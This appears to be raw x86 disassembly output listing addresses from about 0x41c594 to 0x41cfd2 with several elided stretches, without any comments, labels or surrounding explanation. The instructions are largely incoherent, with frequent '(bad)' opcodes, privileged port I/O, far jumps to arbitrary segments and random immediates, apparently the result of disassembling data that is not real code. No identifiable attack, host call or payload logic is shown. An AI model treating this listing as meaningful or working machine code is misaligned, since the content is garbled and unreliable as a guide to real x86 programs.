  41c594:	add    DWORD PTR [esi],eax
  41c596:	leave  
  41c597:	outs   dx,DWORD PTR ds:[esi]
  41c598:	js     0x41c5ac
  41c59a:	dec    ebx
  41c59b:	jl     0x41c619
  41c59d:	dec    eax
  41c59e:	push   ecx
  41c59f:	es lahf 
  41c5a1:	in     eax,dx
  41c5a2:	fst    DWORD PTR [eax-0x18233425]
  41c5a8:	aad    0x80
  41c5aa:	stc    
  41c5ab:	mov    dh,0x7f
  41c5ad:	add    DWORD PTR [ebp-0x60],0xdaa6ac9
  41c5b4:	mov    esp,0x1a80f72e
  41c5b9:	in     eax,dx
  41c5ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c5bb:	mov    eax,0x64906568
  41c5c0:	mov    dh,0x0
	...
  41c632:	add    BYTE PTR [eax],al
  41c634:	test   al,0x63
  41c636:	sbb    edx,DWORD PTR [esi+0x7fadfedb]
  41c63c:	out    dx,eax
  41c63d:	add    al,0x38
  41c63f:	lods   al,BYTE PTR ds:[esi]
  41c640:	imul   ebp,eax,0x4
  41c643:	inc    esp
  41c644:	sbb    al,0x32
  41c646:	add    DWORD PTR [eax],eax
  41c648:	cmc    
  41c649:	add    BYTE PTR [eax],al
  41c64b:	add    BYTE PTR [esi-0x80],al
  41c64e:	adc    edx,ebp
  41c650:	pop    ebx
  41c651:	cmp    al,BYTE PTR [ebx]
  41c653:	lods   eax,DWORD PTR ds:[esi]
  41c654:	inc    eax
  41c655:	lea    edx,[esi-0x297fcce1]
  41c65b:	test   DWORD PTR [esi],ebp
  41c65d:	imul   esp,DWORD PTR [esi],0x4c21a507
  41c663:	jbe    0x41c663
  41c665:	(bad)  
  41c668:	sub    eax,0x7c276c04
  41c66d:	fist   WORD PTR [ebx]
  41c66f:	rcr    bl,cl
  41c671:	cs push 0x1b361af8
  41c677:	clc    
  41c678:	mov    es,esi
  41c67a:	jl     0x41c6bf
  41c67c:	adc    DWORD PTR [esi-0x37],esp
  41c67f:	xchg   esi,eax
  41c680:	adc    eax,0x7ee24c7e
  41c685:	lock les eax,FWORD PTR [edi+edi*2+0x61]
  41c68a:	(bad)  [edx+0x7b]
  41c68d:	popf   
  41c68e:	ret    
  41c68f:	ins    DWORD PTR es:[edi],dx
  41c690:	lock call 0x8721:0x9ac07207
  41c698:	and    dh,dh
  41c69a:	mov    ds:0xc47cbb8,al
  41c69f:	cs fcomip st,st(5)
  41c6a2:	xor    ebx,eax
  41c6a4:	sbb    DWORD PTR [edi+eiz*4],ecx
  41c6a7:	jle    0x41c6fd
  41c6a9:	dec    ecx
  41c6aa:	mov    ebp,0x608f7061
  41c6af:	test   eax,0x8c08f0fd
  41c6b4:	inc    ecx
  41c6b5:	dec    esi
  41c6b6:	pop    ebx
  41c6b7:	bnd jmp 0x58e93493
  41c6bd:	sub    ebp,ebx
  41c6bf:	jo     0x41c64a
  41c6c1:	dec    ebp
  41c6c2:	xor    esi,0x13
  41c6c5:	or     eax,DWORD PTR [ebp-0x2b]
  41c6c8:	js     0x41c6ec
  41c6ca:	fisub  WORD PTR [edx+ebx*4-0x7d]
  41c6ce:	mov    ecx,0xb2095b14
  41c6d3:	stc    
  41c6d4:	nop
  41c6d5:	mov    dh,0xdc
  41c6d7:	jl     0x41c6df
  41c6d9:	ds dec esp
  41c6db:	mov    esi,0x4809b7f8
  41c6e0:	bound  ecx,QWORD PTR [esi-0x27]
  41c6e3:	add    dl,BYTE PTR [esi+ebp*8]
  41c6e6:	jg     0x41c72d
  41c6e8:	enter  0x7bf,0x24
  41c6ec:	mov    ah,0x8b
  41c6ee:	mov    cl,0x75
  41c6f0:	dec    esi
  41c6f1:	push   edi
  41c6f2:	adc    BYTE PTR [edi+edx*1-0x7aa5a090],bh
  41c6f9:	clc    
  41c6fa:	jmp    0x22834fb
  41c6ff:	ins    DWORD PTR es:[edi],dx
  41c700:	fbstp  TBYTE PTR [edx]
  41c702:	xchg   esp,eax
  41c703:	dec    edi
  41c704:	(bad)  
  41c705:	jmp    0x41c6c1
  41c707:	cdq    
  41c708:	cmp    al,0x88
  41c70a:	jo     0x41c77a
  41c70c:	repz jmp 0x8bb18189
  41c712:	lahf   
  41c713:	sub    al,0xc2
  41c715:	adc    bl,0xa3
  41c718:	mov    ah,0x4b
  41c71a:	cmp    al,0x6d
  41c71c:	inc    edi
  41c71d:	mov    ds:0x93c8887a,al
  41c722:	pop    ds
  41c723:	pop    ebp
  41c724:	arpl   WORD PTR [ecx-0x26a27ef6],bp
  41c72a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c72b:	lock lock mov bl,0xfa
  41c72f:	clc    
  41c730:	scas   al,BYTE PTR es:[edi]
  41c731:	cmp    BYTE PTR [eax],0x4b
  41c734:	xor    DWORD PTR [edi+0x10115714],esp
  41c73a:	xchg   esp,eax
  41c73b:	add    al,0x38
  41c73d:	test   DWORD PTR [edx],0xbf54
	...
  41c7b3:	add    BYTE PTR [edx-0x8b13804],cl
  41c7b9:	jg     0x41c746
  41c7bb:	cld    
  41c7bc:	add    edi,esp
  41c7be:	adc    eax,0x23368254
  41c7c3:	not    BYTE PTR [ecx]
  41c7c5:	xor    eax,DWORD PTR [ecx]
  41c7c7:	add    ch,dh
  41c7c9:	add    BYTE PTR [eax],al
  41c7cb:	add    BYTE PTR [edx],ah
  41c7cd:	in     eax,dx
  41c7ce:	mov    ch,0x8a
  41c7d0:	out    dx,eax
  41c7d1:	push   cs
  41c7d2:	or     DWORD PTR [ecx],edx
  41c7d4:	mov    eax,0xe4a35412
  41c7d9:	fcom   st(0)
  41c7db:	test   dl,bh
  41c7dd:	mov    ecx,0xb15d86ab
  41c7e2:	cli    
  41c7e3:	inc    esi
  41c7e4:	sub    al,0x3b
  41c7e6:	xchg   esi,eax
  41c7e7:	in     eax,dx
  41c7e8:	pop    ss
  41c7e9:	mov    cl,0x98
  41c7eb:	mov    ah,0x84
  41c7ed:	mov    bh,0xe0
  41c7ef:	or     eax,0x66d4680b
  41c7f4:	add    DWORD PTR [ebx+0x33],ecx
  41c7f7:	stc    
  41c7f8:	pop    esp
  41c7f9:	in     al,dx
  41c7fa:	hlt    
  41c7fb:	dec    eax
  41c7fc:	xlat   BYTE PTR ds:[ebx]
  41c7fd:	xlat   BYTE PTR ds:[ebx]
  41c7fe:	dec    edi
  41c7ff:	and    BYTE PTR [edx],dl
  41c801:	mov    ecx,0x19368616
  41c806:	sbb    esp,DWORD PTR [eax-0x4fd16984]
  41c80c:	jmp    0x92f8:0x7379dd82
  41c813:	(bad)  
  41c814:	scas   eax,DWORD PTR es:[edi]
  41c815:	mov    cl,0xc4
  41c817:	add    dh,BYTE PTR [esi-0x17075660]
  41c81d:	or     esi,0x6e904ee9
  41c823:	inc    ebx
  41c824:	das    
  41c825:	inc    esp
  41c826:	jl     0x41c83e
  41c828:	cmp    DWORD PTR [edi],edi
  41c82a:	adc    DWORD PTR [edx],esp
  41c82c:	mov    ch,0xdf
  41c82e:	mov    dh,0x86
  41c830:	pop    ebp
  41c831:	or     bh,al
  41c833:	icebp  
  41c834:	mov    dl,0xac
  41c836:	loope  0x41c82f
  41c838:	and    DWORD PTR [edi-0x23],edi
  41c83b:	out    0x5f,eax
  41c83d:	ins    BYTE PTR es:[edi],dx
  41c83e:	(bad)  
  41c83f:	and    eax,0x7d892e38
  41c844:	jl     0x41c7dc
  41c846:	js     0x41c83e
  41c848:	xchg   ebp,eax
  41c849:	sbb    DWORD PTR [ecx],edi
  41c84b:	mov    ebp,0x2495214e
  41c850:	cmp    cl,dh
  41c852:	mov    ds:0xcaf18318,eax
  41c857:	(bad)  
  41c858:	mov    ebx,0x6216ba23
  41c85d:	jle    0x41c823
  41c85f:	push   esp
  41c860:	inc    esp
  41c861:	test   eax,0xf29d1f90
  41c866:	mov    eax,ds:0x65b1adc4
  41c86b:	outs   dx,BYTE PTR ds:[esi]
  41c86c:	add    eax,0xc7aaaa1d
  41c871:	lods   eax,DWORD PTR ds:[esi]
  41c872:	xor    dh,BYTE PTR [edx-0x455f737d]
  41c878:	test   BYTE PTR ds:0xfddb17a3,ch
  41c87e:	sub    edx,DWORD PTR [edx+0x1f]
  41c881:	sub    al,0x41
  41c883:	jo     0x41c8e9
  41c885:	xor    al,0x9d
  41c887:	push   eax
  41c888:	cli    
  41c889:	lods   al,BYTE PTR ds:[esi]
  41c88a:	adc    al,BYTE PTR [ecx-0x16df697]
  41c890:	in     eax,dx
  41c891:	sub    al,0x2
  41c893:	pop    edi
  41c894:	and    DWORD PTR es:[ecx-0x3a1100ed],esp
  41c89b:	daa    
  41c89c:	lods   al,BYTE PTR ds:[esi]
  41c89d:	data16 ficom DWORD PTR [edi+eax*4-0x72fded2f]
  41c8a5:	add    DWORD PTR [edi+0x3b],edx
  41c8a8:	shl    BYTE PTR [edi],0xc4
  41c8ab:	sub    edx,DWORD PTR [edi]
  41c8ad:	jnp    0x41c8b5
  41c8af:	mov    BYTE PTR ds:0xd5be8217,al
  41c8b5:	cmp    eax,edi
  41c8b7:	sub    BYTE PTR [ecx+esi*1+0x13168470],ch
  41c8be:	retf   0xa8d5
	...
  41c931:	add    BYTE PTR [eax],al
  41c933:	add    bl,al
  41c935:	mov    esp,0xf87f4844
  41c93a:	iret   
  41c93b:	mov    edi,0x4f0c9749
  41c940:	adc    DWORD PTR [ebp-0x7c],ebp
  41c943:	aas    
  41c944:	push   es
  41c945:	xor    al,0x1
  41c947:	add    ch,dh
  41c949:	add    BYTE PTR [eax],al
  41c94b:	add    BYTE PTR [eax+0x29f2cb29],ch
  41c951:	mov    ch,0x77
  41c953:	(bad)  
  41c954:	sbb    ebx,DWORD PTR [ebp-0x4f]
  41c957:	adc    BYTE PTR [ebp-0x74],al
  41c95a:	cmp    al,ah
  41c95c:	in     al,0xb7
  41c95e:	push   esp
  41c95f:	ret    0xb3b8
  41c962:	mov    DWORD PTR [eax+0x28],ecx
  41c965:	xor    dl,dh
  41c967:	in     eax,dx
  41c968:	push   ecx
  41c969:	sub    al,0x1
  41c96b:	cmp    al,0x6f
  41c96d:	push   cs
  41c96e:	jl     0x41c934
  41c970:	mul    DWORD PTR [esi-0x1d]
  41c973:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c974:	pop    ebx
  41c975:	outs   dx,DWORD PTR ds:[esi]
  41c976:	pop    esi
  41c977:	add    BYTE PTR [ebx],ah
  41c979:	cmp    al,0x86
  41c97b:	push   ebx
  41c97c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c97d:	leave  
  41c97e:	jb     0x41c9d2
  41c980:	fistp  WORD PTR [edi-0x530f81d8]
  41c986:	xor    BYTE PTR [ebp-0x20],dl
  41c989:	adc    eax,DWORD PTR [ebx+0x8]
  41c98c:	in     al,dx
  41c98d:	call   0xee8:0x790a16ed
  41c994:	mov    ss,WORD PTR [ebp+0x2f]
  41c997:	push   edx
  41c998:	adc    DWORD PTR [edx-0x4e],edi
  41c99b:	cmp    dl,dl
  41c99d:	or     al,0x72
  41c99f:	fisubr WORD PTR [edx]
  41c9a1:	popf   
  41c9a2:	adc    BYTE PTR [esp+edi*2],al
  41c9a5:	call   0xd3730bed
  41c9aa:	pop    es
  41c9ab:	jae    0x41c949
  41c9ad:	sbb    esp,DWORD PTR [esi-0x26]
  41c9b0:	adc    ch,bh
  41c9b2:	fimul  DWORD PTR [edx+edx*4-0x4346f83e]
  41c9b9:	(bad)  
  41c9ba:	test   al,0xbf
  41c9bc:	mov    ch,0x29
  41c9be:	mov    cl,BYTE PTR [edx+0x6fec9e17]
  41c9c4:	or     eax,DWORD PTR [eax-0x2b]
  41c9c7:	jecxz  0x41c99b
  41c9c9:	scas   eax,DWORD PTR es:[edi]
  41c9ca:	jo     0x41c9b4
  41c9cc:	jmp    0xd577:0x6426509e
  41c9d3:	sub    ch,BYTE PTR [ebp-0x47]
  41c9d6:	inc    ecx
  41c9d7:	mov    edx,DWORD PTR [edx-0x44]
  41c9da:	mov    BYTE PTR [ebx-0x155eb99c],ch
  41c9e0:	call   0xc92323bd
  41c9e5:	mov    dh,0xbc
  41c9e7:	popa   
  41c9e8:	pop    ebx
  41c9e9:	sub    BYTE PTR [ebx-0x2bda1cf1],bh
  41c9ef:	sub    DWORD PTR [eax],ecx
  41c9f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9f2:	push   esi
  41c9f3:	sub    eax,0xd6a9d597
  41c9f8:	enter  0x22d2,0x95
  41c9fc:	dec    esi
  41c9fd:	cmp    eax,esp
  41c9ff:	int    0xfe
  41ca01:	xor    edi,ebp
  41ca03:	aam    0xfe
  41ca05:	in     al,0x6
  41ca07:	dec    ecx
  41ca08:	ffreep st(0)
  41ca0a:	ret    
  41ca0b:	inc    edi
  41ca0c:	or     edi,DWORD PTR [edi]
  41ca0e:	(bad)  
  41ca0f:	rcr    BYTE PTR [ebp-0x37],cl
  41ca12:	loope  0x41ca80
  41ca14:	je     0x41ca63
  41ca16:	mov    ecx,0x56c27011
  41ca1b:	sbb    ch,BYTE PTR [edi-0x77]
  41ca1e:	rcr    DWORD PTR [di-0x13b8],cl
  41ca23:	mov    eax,esi
  41ca25:	fld    QWORD PTR [ecx+0x6bb5fd5d]
  41ca2b:	scas   eax,DWORD PTR es:[edi]
  41ca2c:	or     DWORD PTR [edx+0x2d],edx
  41ca2f:	sbb    al,0x57
  41ca31:	add    BYTE PTR [ebx-0x5fde66e8],cl
  41ca37:	sbb    ch,BYTE PTR [ebp+0x61a5095d]
  41ca3d:	add    DWORD PTR [ebp-0x31],esp
  41ca40:	aad    0x0
	...
  41cab2:	add    BYTE PTR [eax],al
  41cab4:	or     bh,BYTE PTR [eax-0x4048555b]
  41caba:	(bad)  
  41cabc:	sbb    eax,0x97e2887e
  41cac1:	outs   dx,BYTE PTR ds:[esi]
  41cac2:	pop    edi
  41cac3:	dec    edi
  41cac4:	sti    
  41cac5:	xor    al,0x1
  41cac7:	add    ch,dh
  41cac9:	add    BYTE PTR [eax],al
  41cacb:	add    BYTE PTR [edx+0x45aea4c6],ch
  41cad1:	mov    ebx,0xe1f010a6
  41cad6:	test   eax,0xe8b9dc69
  41cadb:	pushfw 
  41cadd:	pop    edx
  41cade:	xlat   BYTE PTR ds:[ebx]
  41cadf:	addr16 mov edi,0x1e4aed4c
  41cae5:	mov    esp,0x7ae7da35
  41caea:	fs cdq 
  41caec:	(bad)  
  41caed:	jmp    0x981:0x33079094
  41caf4:	and    DWORD PTR [eax+edx*4-0x2ea3db],0x627c9933
  41caff:	int    0x52
  41cb01:	aad    0xd4
  41cb03:	neg    BYTE PTR ds:[ebp+0x2c89eb8a]
  41cb0a:	cmp    DWORD PTR [ecx],ebx
  41cb0c:	push   edx
  41cb0d:	push   ss
  41cb0e:	popf   
  41cb0f:	jno    0x41cae9
  41cb11:	lds    ecx,FWORD PTR [ebx+ebx*1]
  41cb14:	outs   dx,DWORD PTR ds:[esi]
  41cb15:	jg     0x41caa1
  41cb17:	xor    edi,0xd196d650
  41cb1d:	hlt    
  41cb1e:	leave  
  41cb1f:	push   ebx
  41cb20:	mov    al,ds:0xdd3c2a59
  41cb25:	pop    edx
  41cb26:	fmul   st(6),st
  41cb28:	push   ss
  41cb29:	and    BYTE PTR [eax+0x2a351701],0x6d
  41cb30:	jb     0x41cb32
  41cb32:	nop
  41cb33:	sub    ch,dl
  41cb35:	call   0x6ee9a1b7
  41cb3a:	lahf   
  41cb3b:	or     al,BYTE PTR [edi]
  41cb3d:	(bad)  
  41cb3e:	adc    BYTE PTR [eax-0x1d],bl
  41cb41:	xchg   esi,eax
  41cb42:	mov    bl,0x8a
  41cb44:	int    0x1e
  41cb46:	mov    DWORD PTR [ebx-0x59],esp
  41cb49:	jbe    0x41cadf
  41cb4b:	and    ah,ah
  41cb4d:	xchg   edi,eax
  41cb4e:	cmp    eax,0x281557bd
  41cb53:	hlt    
  41cb54:	jno    0x41cbb1
  41cb56:	ja     0x41cb6b
  41cb58:	stos   BYTE PTR es:[edi],al
  41cb59:	xchg   ebp,eax
  41cb5a:	cdq    
  41cb5b:	scas   al,BYTE PTR es:[edi]
  41cb5c:	fs inc ecx
  41cb5e:	adc    al,0xfc
  41cb60:	or     BYTE PTR [edx+0x1a33ca13],0xfd
  41cb67:	in     al,dx
  41cb68:	les    ebp,FWORD PTR [esi]
  41cb6a:	cli    
  41cb6b:	pop    ebx
  41cb6c:	sub    al,0xfd
  41cb6e:	sbb    esp,DWORD PTR [esi+esi*1]
  41cb71:	inc    eax
  41cb72:	pop    ebx
  41cb73:	cmp    ebx,ebp
  41cb75:	xchg   ebp,eax
  41cb76:	inc    ecx
  41cb77:	mul    ecx
  41cb79:	pop    ss
  41cb7a:	(bad)
  41cb7e:	sbb    ax,0x71f0
  41cb82:	leave  
  41cb83:	sub    bl,cl
  41cb85:	cmp    al,0x94
  41cb87:	pop    ebp
  41cb88:	cmp    DWORD PTR [edx-0x64],esp
  41cb8b:	inc    edx
  41cb8c:	fucomip st,st(7)
  41cb8e:	rcl    DWORD PTR [ebx+esi*4-0x4b],1
  41cb92:	pop    ds
  41cb93:	stc    
  41cb94:	mov    dh,0xd7
  41cb97:	jmp    0x41cbfb
  41cb99:	pop    eax
  41cb9a:	and    BYTE PTR [edi-0x52],bh
  41cb9d:	dec    BYTE PTR [ecx-0x410fc46f]
  41cba3:	std    
  41cba4:	push   edx
  41cba5:	cwde   
  41cba6:	es jp  0x41cb98
  41cba9:	mov    dh,0x6d
  41cbab:	rol    edx,0x9a
  41cbae:	mov    ebx,0x3e0d744c
  41cbb3:	xchg   DWORD PTR [ebx+0x238dfda6],esi
  41cbb9:	or     eax,0xa5c2378b
  41cbbe:	and    BYTE PTR ds:0xaf,bl
	...
  41cc34:	shl    BYTE PTR [edx],cl
  41cc36:	cli    
  41cc37:	clc    
  41cc38:	cli    
  41cc39:	clc    
  41cc3a:	sar    BYTE PTR [edx],cl
  41cc3c:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc3e:	inc    eax
  41cc3f:	aam    0x18
  41cc41:	inc    ecx
  41cc42:	loope  0x41cbd6
  41cc44:	lock xor eax,0xf50001
  41cc4a:	add    BYTE PTR [eax],al
  41cc4c:	xlat   BYTE PTR ds:[ebx]
  41cc4d:	add    dh,cl
  41cc4f:	or     eax,0xf6b139d3
  41cc54:	dec    ebx
  41cc55:	xchg   DWORD PTR [ebp-0x8a2ab55],ebp
  41cc5b:	outs   dx,DWORD PTR ds:[esi]
  41cc5c:	and    al,0xe4
  41cc5e:	fstp   st(6)
  41cc60:	fcom   QWORD PTR ss:[edx-0x11]
  41cc64:	pop    edx
  41cc65:	imul   ebx,DWORD PTR [esi],0x7
  41cc68:	jo     0x41cbf6
  41cc6a:	ds std 
  41cc6c:	adc    esi,DWORD PTR [ebx+0x4e]
  41cc6f:	bound  ebp,QWORD PTR [eax-0x286095bb]
  41cc75:	les    esp,FWORD PTR [edi+ebp*1+0x38]
  41cc79:	aam    0x7c
  41cc7b:	cmc    
  41cc7c:	(bad)  
  41cc7d:	pop    ebx
  41cc7e:	aaa    
  41cc7f:	inc    ebp
  41cc80:	xchg   DWORD PTR [ebp+0x5f],edx
  41cc83:	dec    esi
  41cc84:	es dec edx
  41cc86:	cmp    BYTE PTR [ebp+edi*8-0x3e],dh
  41cc8a:	loop   0x41cca6
  41cc8c:	dec    esp
  41cc8d:	dec    ecx
  41cc8e:	test   eax,0xff374b83
  41cc93:	aad    0xb4
  41cc95:	jae    0x41ccd4
  41cc97:	sub    eax,0x8d933c60
  41cc9c:	retf   0x2e9e
  41cc9f:	cmp    DWORD PTR [ecx-0x37dbaa4d],0xfffffff2
  41cca6:	xor    ebp,DWORD PTR [esi+0x22]
  41cca9:	stos   DWORD PTR es:[edi],eax
  41ccaa:	mov    edx,DWORD PTR [edi]
  41ccac:	cs cmp al,0x9
  41ccaf:	gs sbb edi,edx
  41ccb2:	in     al,dx
  41ccb3:	xchg   edi,eax
  41ccb4:	or     eax,0x10766eec
  41ccb9:	mov    esi,0xd4f52bc8
  41ccbe:	jbe    0x41cd0e
  41ccc0:	retf   0x212a
  41ccc3:	xchg   edx,eax
  41ccc4:	mov    al,ds:0x94ac1603
  41ccc9:	push   es
  41ccca:	repz aas 
  41cccc:	rcr    BYTE PTR [eax+0x936d5ea],cl
  41ccd2:	fwait
  41ccd3:	stos   BYTE PTR es:[edi],al
  41ccd4:	or     ch,BYTE PTR [esi+0x31]
  41ccd7:	push   esp
  41ccd8:	pop    esi
  41ccd9:	adc    BYTE PTR [eax+ebp*2],0xdb
  41ccdd:	push   esp
  41ccde:	fwait
  41ccdf:	popf   
  41cce0:	les    edi,FWORD PTR [edx]
  41cce2:	sub    DWORD PTR [edx+edx*8-0x49],esp
  41cce6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cce7:	xor    al,0xb6
  41cce9:	aad    0x3
  41cceb:	gs loope 0x41ccdc
  41ccee:	and    esi,DWORD PTR [ebp+0x63]
  41ccf1:	inc    edi
  41ccf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ccf3:	sbb    DWORD PTR [edx-0x5b],ecx
  41ccf6:	outs   dx,BYTE PTR ds:[esi]
  41ccf7:	adc    ebx,DWORD PTR [ebp+0x8]
  41ccfa:	adc    BYTE PTR [edx+0x2],dh
  41ccfd:	aad    0xef
  41ccff:	push   ecx
  41cd00:	cli    
  41cd01:	iret   
  41cd02:	dec    ebp
  41cd03:	add    al,0xa0
  41cd05:	add    bh,bl
  41cd07:	cmp    ah,BYTE PTR [ecx]
  41cd09:	aad    0x56
  41cd0b:	xlat   BYTE PTR ds:[ebx]
  41cd0c:	std    
  41cd0d:	dec    ebp
  41cd0e:	clc    
  41cd0f:	sub    BYTE PTR [ecx],bh
  41cd11:	xchg   ebp,eax
  41cd12:	retf   0x8cd7
  41cd15:	mov    cl,BYTE PTR [edi]
  41cd17:	or     al,0x52
  41cd19:	inc    eax
  41cd1a:	push   eax
  41cd1b:	nop
  41cd1c:	int3   
  41cd1d:	shr    BYTE PTR [ecx],1
  41cd1f:	push   ecx
  41cd20:	xlat   BYTE PTR ds:[ebx]
  41cd21:	adc    esp,DWORD PTR [esi-0x79]
  41cd24:	in     eax,0xbd
  41cd26:	jb     0x41cd49
  41cd28:	xchg   esi,eax
  41cd29:	in     eax,0x8a
  41cd2b:	jns    0x41cd4f
  41cd2d:	call   0x85a79010
  41cd32:	sbb    ch,dl
  41cd34:	aaa    
  41cd35:	int3   
  41cd36:	call   0x846e:0xdd63bacb
  41cd3d:	jle    0x41cd14
  41cd3f:	dec    edi
  41cd40:	rol    DWORD PTR [eax],cl
	...
  41cdb2:	add    BYTE PTR [eax],al
  41cdb4:	test   DWORD PTR [ebp+0x7b9c6a9c],ecx
  41cdba:	imul   edi
  41cdbc:	push   ebp
  41cdbd:	call   0x323b:0xeac7b1bb
  41cdc4:	in     eax,0x36
  41cdc6:	add    DWORD PTR [eax],eax
  41cdc8:	cmc    
  41cdc9:	add    BYTE PTR [eax],al
  41cdcb:	add    BYTE PTR [esi],ch
  41cdcd:	stos   BYTE PTR es:[edi],al
  41cdce:	jmp    FWORD PTR [ecx-0x2f]
  41cdd1:	data16 adc bh,BYTE PTR ss:[ebx]
  41cdd5:	cmp    eax,0x2e335b72
  41cdda:	lods   al,BYTE PTR ds:[esi]
  41cddb:	dec    ebp
  41cddc:	jo     0x41ce3d
  41cdde:	xchg   edx,eax
  41cddf:	mov    esi,0xb3edbfc
  41cde4:	shl    BYTE PTR [ecx+edi*8],1
  41cde7:	call   0x61c9bf31
  41cdec:	ins    BYTE PTR es:[di],dx
  41cdee:	adc    DWORD PTR [edx],ecx
  41cdf0:	loopne 0x41cdae
  41cdf2:	lods   al,BYTE PTR ds:[esi]
  41cdf3:	sub    cl,BYTE PTR [eax+edi*4-0x61]
  41cdf7:	add    ebx,DWORD PTR [eax]
  41cdf9:	sbb    eax,0x33e4e584
  41cdfe:	in     al,0xc2
  41ce00:	push   0xa9ed8ad2
  41ce05:	(bad)  
  41ce06:	jno    0x41ce7e
  41ce08:	fcom   QWORD PTR [esp+ebx*4-0x67]
  41ce0c:	jne    0x41cdab
  41ce0e:	cmp    al,0xac
  41ce10:	jecxz  0x41cdc6
  41ce12:	das    
  41ce13:	bound  edi,QWORD PTR [ecx+0xb]
  41ce16:	cdq    
  41ce17:	je     0x41ce14
  41ce19:	dec    ebp
  41ce1a:	inc    ebx
  41ce1b:	dec    ecx
  41ce1c:	pop    ebp
  41ce1d:	das    
  41ce1e:	in     eax,0x2c
  41ce20:	test   eax,0xe4d966a6
  41ce25:	xlat   BYTE PTR ds:[ebx]
  41ce26:	dec    ebx
  41ce27:	arpl   sp,bx
  41ce29:	inc    eax
  41ce2a:	sbb    bh,BYTE PTR fs:[ecx+0x48]
  41ce2e:	jmp    0x41ce87
  41ce30:	lds    eax,FWORD PTR [esi]
  41ce32:	and    edx,DWORD PTR [esi+0x54]
  41ce35:	push   cs
  41ce36:	test   al,0xf2
  41ce38:	loop   0x41cde3
  41ce3a:	dec    edx
  41ce3b:	out    0x33,al
  41ce3d:	sbb    ebx,DWORD PTR [edi]
  41ce3f:	cmp    ebx,eax
  41ce41:	call   0x8a5d999f
  41ce46:	or     al,0x38
  41ce48:	dec    ebx
  41ce49:	inc    ebx
  41ce4a:	rol    DWORD PTR [eax-0x63],cl
  41ce4d:	or     eax,0xf96c3c66
  41ce52:	push   eax
  41ce53:	xor    BYTE PTR [eax],ah
  41ce55:	add    eax,edx
  41ce57:	inc    ebp
  41ce58:	or     bh,BYTE PTR [ecx+0x6346406e]
  41ce5e:	jl     0x41ce83
  41ce60:	sbb    ch,cl
  41ce62:	push   edx
  41ce63:	sub    al,0x1c
  41ce65:	leave  
  41ce66:	sahf   
  41ce67:	sbb    al,0x1a
  41ce69:	mov    al,ds:0xfda1bbfc
  41ce6e:	or     ebp,ebx
  41ce70:	pop    edi
  41ce71:	push   ecx
  41ce72:	stos   BYTE PTR es:[edi],al
  41ce73:	push   eax
  41ce74:	mov    eax,0x24ae0f2c
  41ce79:	ret    
  41ce7a:	mov    ecx,0xeff54055
  41ce7f:	ss out 0xc1,al
  41ce82:	ja     0x41ceee
  41ce84:	and    ecx,DWORD PTR [ecx+0x965de1f]
  41ce8a:	inc    edi
  41ce8b:	inc    esi
  41ce8c:	sub    DWORD PTR [ebp+0x10b3e25d],ebp
  41ce92:	inc    eax
  41ce93:	ss inc edx
  41ce95:	mov    edx,0x1d3b2112
  41ce9a:	loop   0x41ce94
  41ce9c:	adc    al,0x3a
  41ce9e:	pop    esi
  41ce9f:	and    esi,DWORD PTR [ecx+eax*4+0x54]
  41cea3:	lock sub al,0xd1
  41cea6:	clc    
  41cea7:	ret    
  41cea8:	xor    al,0x28
  41ceaa:	leave  
  41ceab:	mov    edi,0x6c31f812
  41ceb0:	dec    edi
  41ceb1:	call   0x388adf6c
  41ceb6:	or     al,0x9e
  41ceb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ceb9:	enter  0xc5a8,0x40
  41cebd:	cdq    
  41cebe:	fild   WORD PTR [ebx]
  41cec0:	push   0x0
	...
  41cf32:	add    BYTE PTR [eax],al
  41cf34:	fs jae 0x41cf6a
  41cf37:	es aaa 
  41cf39:	data16 jne 0x41cfaf
  41cf3c:	cmc    
  41cf3d:	jle    0x41cf41
  41cf3f:	dec    esi
  41cf40:	jns    0x41cf4f
  41cf42:	push   ds
  41cf43:	leave  
  41cf44:	fidiv  DWORD PTR [edi]
  41cf46:	add    DWORD PTR [eax],eax
  41cf48:	cmc    
  41cf49:	add    BYTE PTR [eax],al
  41cf4b:	add    dh,ch
  41cf4d:	rcr    DWORD PTR [ebp+edi*8-0x4d],1
  41cf51:	dec    eax
  41cf52:	dec    edi
  41cf53:	mov    edx,0x305071f4
  41cf58:	cmp    bl,BYTE PTR [ebx]
  41cf5a:	stos   BYTE PTR es:[edi],al
  41cf5b:	idiv   DWORD PTR [edx+ebp*8]
  41cf5e:	xor    cl,BYTE PTR [esi]
  41cf60:	xchg   ebp,eax
  41cf61:	dec    esp
  41cf62:	test   al,0x5a
  41cf64:	inc    ebp
  41cf65:	scas   al,BYTE PTR es:[edi]
  41cf66:	mov    esi,0x62053a6a
  41cf6b:	stos   DWORD PTR es:[edi],eax
  41cf6c:	aam    0x8e
  41cf6e:	add    BYTE PTR [eax-0x4a9c28c9],0x6a
  41cf75:	fwait
  41cf76:	xchg   esi,eax
  41cf77:	mov    ah,0x9
  41cf79:	mov    ds:0xe2d275a4,al
  41cf7e:	call   0xee2a2c82
  41cf83:	repnz (bad) 
  41cf85:	mov    ds:0x1e7d06b9,eax
  41cf8a:	mov    bh,0x4f
  41cf8c:	enter  0xe7af,0xd1
  41cf90:	mov    ch,0x44
  41cf92:	push   es
  41cf93:	push   edi
  41cf94:	rcr    DWORD PTR [edi-0x3e],cl
  41cf97:	sub    dh,0xa5
  41cf9a:	or     BYTE PTR [esi+0x2065aa96],bl
  41cfa0:	jmp    0xb90f97e9
  41cfa5:	bound  edx,QWORD PTR [edi*4+0x64b5e501]
  41cfac:	pop    edx
  41cfad:	sbb    edx,DWORD PTR [edi+0x26bfcf03]
  41cfb3:	arpl   WORD PTR ds:0x84b07b06,ax
  41cfb9:	ins    DWORD PTR es:[edi],dx
  41cfba:	or     dh,ah
  41cfbc:	xchg   BYTE PTR [eax*1+0x5a61b262],bh
  41cfc3:	rol    esp,0xbd
  41cfc6:	mov    esp,0xf1e0201f
  41cfcb:	pop    edx
  41cfcc:	loop   0x41cf64
  41cfce:	jae    0x41d00e
  41cfd0:	push   ebp
  41cfd1:	inc    eax
  41cfd2:	daa    
